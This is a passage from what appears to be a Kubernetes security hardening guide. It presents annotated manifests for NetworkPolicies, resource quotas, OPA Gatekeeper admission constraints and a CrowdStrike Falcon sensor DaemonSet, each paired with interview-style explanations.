metadata:
  name: prometheus-reader-binding
subjects:
- kind: ServiceAccount
  name: prometheus-sa
  namespace: monitoring
roleRef:
  kind: ClusterRole
  name: prometheus-reader
  apiGroup: rbac.authorization.k8s.io
```

**Interview Explanation:**
> "I follow least-privilege RBAC. Most ServiceAccounts should have `automountServiceAccountToken: false`. For Prometheus, which needs API access to discover pods, I create a ClusterRole with only `get`, `list`, `watch` on pods and endpoints — nothing else. I explicitly exclude secrets access. CIEM flags any ServiceAccount with wildcard permissions."

---

# SECTION 4: NETWORK POLICIES — Default Deny + Allow Specific

## Example 4.1: Default Deny All (Apply to EVERY Namespace)

```yaml
# FILE: netpol-default-deny.yaml
# PURPOSE: Block ALL traffic by default — then selectively allow
# APPLY TO: Every production namespace
# WHY: Without this, all pods can talk to all pods (flat network = bad)

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: payments         # Apply to each namespace
spec:
  podSelector: {}             # ✅ Matches ALL pods in this namespace
  policyTypes:
  - Ingress                   # ✅ Block all INCOMING traffic
  - Egress                    # ✅ Block all OUTGOING traffic
  # RESULT: No pod in "payments" can send or receive ANY traffic
  # You must now create ALLOW rules for legitimate flows
```

## Example 4.2: Allow Specific Traffic (Frontend → Backend)

```yaml
# FILE: netpol-allow-frontend-to-backend.yaml
# PURPOSE: Allow frontend pods to reach backend API on port 8443 only

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-ingress
  namespace: backend-services
spec:
  podSelector:
    matchLabels:
      app: api-server          # ✅ This policy applies to api-server pods

  policyTypes:
  - Ingress

  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          app-tier: frontend   # ✅ Only from namespaces labeled "frontend"
      podSelector:
        matchLabels:
          app: web-ui          # ✅ Only from pods labeled "web-ui"
    ports:
    - protocol: TCP
      port: 8443               # ✅ Only on port 8443 — nothing else
  # RESULT: Only web-ui pods from the frontend namespace can reach
  #         api-server pods on port 8443. All other traffic is blocked.
```

## Example 4.3: Allow DNS Egress (Required for Most Pods)

```yaml
# FILE: netpol-allow-dns.yaml
# PURPOSE: Allow pods to reach CoreDNS for name resolution
# WHY: With default-deny egress, pods can't resolve DNS → apps break

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: payments
spec:
  podSelector: {}              # ✅ All pods in namespace

  policyTypes:
  - Egress

  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53                 # ✅ DNS only
    - protocol: TCP
      port: 53
  # WHY: This allows DNS resolution via CoreDNS in kube-system
  #       but blocks direct DNS to external servers (prevents DNS tunneling)
  # SECURITY: If a pod queries an external DNS (8.8.8.8), it's BLOCKED
  #           → forces all DNS through cluster → detectable and controllable
```

**Interview Explanation:**
> "I apply default-deny on every production namespace, then build allow-rules for legitimate flows. The critical detail most people miss: after default-deny egress, pods can't do DNS lookups. So I add an allow-DNS rule scoped to CoreDNS only. This also prevents DNS tunneling — if a pod tries to query an external DNS server, it's blocked by the NetworkPolicy."

---

# SECTION 5: RESOURCE CONTROLS — LimitRange & ResourceQuota

## Example 5.1: LimitRange (Per-Container Defaults)

```yaml
# FILE: limitrange-production.yaml
# PURPOSE: Auto-apply resource limits to containers that don't specify them
# WHY: If a developer forgets to set limits, the LimitRange provides defaults
#       preventing a single pod from consuming all node resources

apiVersion: v1
kind: LimitRange
metadata:
  name: production-limits
  namespace: payments
spec:
  limits:
  - type: Container
    default:                   # Applied if container has NO limits specified
      cpu: "500m"
      memory: "512Mi"
    defaultRequest:            # Applied if container has NO requests specified
      cpu: "100m"
      memory: "128Mi"
    max:                       # Hard ceiling — cannot exceed even if specified
      cpu: "2"
      memory: "2Gi"
    min:                       # Floor — cannot go below
      cpu: "50m"
      memory: "64Mi"
  # WHY max: Even if a developer sets limits: cpu: "100" (100 cores!),
  #          LimitRange caps it at 2 cores. Prevents resource hoarding.
```

## Example 5.2: ResourceQuota (Per-Namespace Limits)

```yaml
# FILE: resourcequota-payments.yaml
# PURPOSE: Limit the TOTAL resources the payments namespace can consume
# WHY: Prevents one namespace from starving others on the cluster

apiVersion: v1
kind: ResourceQuota
metadata:
  name: payments-quota
  namespace: payments
spec:
  hard:
    requests.cpu: "10"          # Max 10 CPU cores total for all pods combined
    requests.memory: "20Gi"     # Max 20 GiB memory requested total
    limits.cpu: "20"            # Max 20 CPU cores limit total
    limits.memory: "40Gi"       # Max 40 GiB memory limit total
    pods: "50"                  # Max 50 pods in this namespace
    services: "10"              # Max 10 services
    secrets: "20"               # Max 20 secrets
    configmaps: "20"            # Max 20 configmaps
  # WHY pods limit: prevents runaway deployments (e.g., someone sets replicas: 9999)
  # WHY secrets limit: prevents attackers from creating many secrets as persistence
```

---

# SECTION 6: KAC (KUBERNETES ADMISSION CONTROLLER) POLICIES

> **Note:** KAC is configured in the CrowdStrike Falcon console, not in YAML manifests.
> Below are the equivalent OPA/Gatekeeper policies that achieve the same goals.

## Example 6.1: OPA Gatekeeper — Block Privileged Containers

```yaml
# FILE: constraint-template-privileged.yaml
# PURPOSE: Define the CHECK — "is this container privileged?"

apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sBlockPrivilegedContainer
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sblockprivilegedcontainer

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        container.securityContext.privileged == true
        msg := sprintf("Container '%v' must not run as privileged. Remove privileged: true. If you need specific kernel access, use capabilities.add with only the required capability.", [container.name])
      }

      # Also check initContainers (attackers hide malicious code here)
      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        container.securityContext.privileged == true
        msg := sprintf("InitContainer '%v' must not run as privileged.", [container.name])
      }

---
# FILE: constraint-privileged.yaml
# PURPOSE: APPLY the check to specific namespaces

apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockPrivilegedContainer
metadata:
  name: block-privileged-except-system
spec:
  enforcementAction: deny     # Options: deny, dryrun, warn
  # ↑ "deny" = PREVENT mode (blocks deployment)
  # ↑ "dryrun" = ALERT mode (logs but allows)
  # ↑ "warn" = shows warning to user

  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    - apiGroups: ["apps"]
      kinds: ["Deployment", "StatefulSet", "DaemonSet"]
    excludedNamespaces:
    - kube-system              # ✅ Allow: CNI plugins may need privileged
    - falcon-system            # ✅ Allow: Falcon sensor needs privileged
    - calico-system            # ✅ Allow: Calico CNI needs privileged
    # Everything else: BLOCKED
```

## Example 6.2: OPA Gatekeeper — Enforce Registry Allowlist

```yaml
# FILE: constraint-template-registry.yaml
# PURPOSE: Only allow images from approved private registries

apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          type: object
          properties:
            registries:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedregistries

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not startswith(container.image, allowed_registry)
        msg := sprintf(
          "Container '%v' uses image '%v' from an unapproved registry. Only these registries are allowed: %v",
          [container.name, container.image, input.parameters.registries]
        )
      }

      allowed_registry = registry {
        registry := input.parameters.registries[_]
        startswith(input.review.object.spec.containers[_].image, registry)
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRegistries
metadata:
  name: only-private-ecr
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    registries:
    - "123456789.dkr.ecr.us-east-1.amazonaws.com/"
    - "123456789.dkr.ecr.us-west-2.amazonaws.com/"
    # ↑ Only our private ECR registries are allowed
    # ❌ docker.io, ghcr.io, quay.io are BLOCKED
    # WHY: Public registries are supply chain attack vectors
    #       All images must be mirrored to private ECR and scanned first
```

## Example 6.3: OPA Gatekeeper — Require Labels on Deployments

```yaml
# FILE: constraint-required-labels.yaml
# PURPOSE: Every deployment MUST have owner and team labels
# WHY: Without labels, we can't route security tickets to the right team

apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredlabels

      violation[{"msg": msg}] {
        required := input.parameters.labels[_]
        not input.review.object.metadata.labels[required]
        msg := sprintf(
          "Deployment must have label '%v'. This is required for security ticket routing and CMDB asset mapping.",
          [required]
        )
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-owner-labels
spec:
  enforcementAction: warn      # WARN first, not deny — less disruptive
  match:
    kinds:
    - apiGroups: ["apps"]
      kinds: ["Deployment"]
  parameters:
    labels:
    - "app.kubernetes.io/name"
    - "app.kubernetes.io/owner"
    - "app.kubernetes.io/team"
    - "data-classification"
    # WHY: When CNAPP finds a vulnerability in a pod, I need to know:
    #   - Which app? (name)
    #   - Who owns it? (owner)
    #   - Which team? (team → ServiceNow assignment group)
    #   - What data does it handle? (classification → SLA priority)
```

---

# SECTION 7: FALCON SENSOR DAEMONSET

```yaml
# FILE: falcon-sensor-daemonset.yaml
# PURPOSE: Deploy CrowdStrike Falcon sensor on every K8s node
# WHY: This is your CWPP runtime protection layer

apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falcon-sensor
  namespace: falcon-system     # Privileged namespace (see Example 1.3)
  labels:
    app: falcon-sensor
spec:
  selector:
    matchLabels:
      app: falcon-sensor
  template:
    metadata:
      labels:
        app: falcon-sensor
    spec:
      # ── TOLERATIONS: run on EVERY node, including tainted ones ────
      tolerations:
      - operator: Exists
        # ↑ ✅ Tolerates ALL taints — sensor MUST run on every node
        # WHY: If a node group has custom taints and the sensor doesn't
        #       tolerate them, you get a coverage gap (Scenario 20)
        #       100% coverage is non-negotiable

      # ── NODE SELECTOR / AFFINITY ──────────────────────────────────
      # DaemonSet runs on ALL nodes by default — no selector needed
      # unless you want to exclude specific node types (e.g., Fargate)

      # ── HOST ACCESS (required for runtime monitoring) ─────────────
      hostPID: true            # ✅ Required: see all processes on the node
      hostNetwork: false       # ✅ Not needed: sensor communicates via pod network

      serviceAccountName: falcon-sensor-sa

      containers:
      - name: falcon-sensor
        image: 123456789.dkr.ecr.us-east-1.amazonaws.com/falcon-sensor:7.10.0
        # ↑ ✅ From private ECR, specific version (not :latest)

        securityContext:
          privileged: true     # ✅ Required: kernel-level eBPF access
          # WHY: The sensor hooks into kernel syscall entry points via eBPF
          #       This requires CAP_SYS_ADMIN + access to /proc, /sys
          #       This is THE legitimate use case for privileged containers

        env:
        - name: FALCON_CID
          valueFrom:
            secretKeyRef:
              name: falcon-config
              key: cid
              # ↑ ✅ CID from K8s secret (not hardcoded in manifest)

        volumeMounts:
        - name: proc
          mountPath: /host/proc
          readOnly: true       # ✅ Read-only: sensor observes, doesn't modify
        - name: etc
          mountPath: /host/etc
          readOnly: true

        resources:
          requests:
            cpu: "100m"
            memory: "256Mi"
          limits:
            cpu: "500m"
            memory: "512Mi"
          # ✅ Resource limits even on the sensor
          # WHY: Prevents sensor from consuming too many node resources
          #       512Mi is typically sufficient for normal operation

      volumes:
      - name: proc
        hostPath:
          path: /proc          # ✅ Required: process visibility
      - name: etc
        hostPath:
          path: /etc           # ✅ Required: host configuration visibility
```

**Interview Explanation:**
> "The Falcon sensor DaemonSet runs on every node with `tolerations: [{operator: Exists}]` to ensure 100% coverage. It's the one legitimate case for a privileged container — it needs eBPF access for syscall interception. I mount `/proc` and `/etc` read-only so the sensor observes but never modifies the host. The CID is stored in a K8s secret, not hardcoded. Even the sensor gets resource limits to prevent it from starving other workloads."

---

# 📋 MANIFEST SUMMARY TABLE

| Example | File | PSS Profile | Key Lesson |
|---------|------|-------------|------------|
| 1.1 | namespace-payments.yaml | restricted | Enforce + Audit + Warn + Version Pin |
| 1.2 | namespace-backend.yaml | baseline | Enforce baseline, Audit restricted (progressive) |
| 1.3 | namespace-falcon-system.yaml | privileged | Only for system infrastructure, with justification |
| 2.1 | bad-pod.yaml | ❌ Fails everything | 9 violations — what NOT to do |
| 2.2 | secure-pod.yaml | ✅ Passes restricted | All 17 controls satisfied, fully annotated |
| 3.1 | sa-payment-api.yaml | N/A | automountServiceAccountToken: false + IRSA |
| 3.2 | sa-monitoring.yaml | N/A | Least-privilege RBAC — read-only ClusterRole |
| 4.1 | netpol-default-deny.yaml | N/A | Default deny all — foundation of network security |
| 4.2 | netpol-allow-frontend.yaml | N/A | Selective allow by namespace + pod + port |
| 4.3 | netpol-allow-dns.yaml | N/A | Allow CoreDNS only — blocks DNS tunneling |
| 5.1 | limitrange.yaml | N/A | Per-container resource defaults and ceilings |
| 5.2 | resourcequota.yaml | N/A | Per-namespace total resource limits |
| 6.1 | gatekeeper-privileged.yaml | N/A | KAC equivalent — block privileged containers |
| 6.2 | gatekeeper-registry.yaml | N/A | KAC equivalent — enforce private registry only |
| 6.3 | gatekeeper-labels.yaml | N/A | KAC equivalent — require labels for ticket routing |
| 7 | falcon-daemonset.yaml | privileged (required) | Sensor deployment with tolerations and resource limits |


---

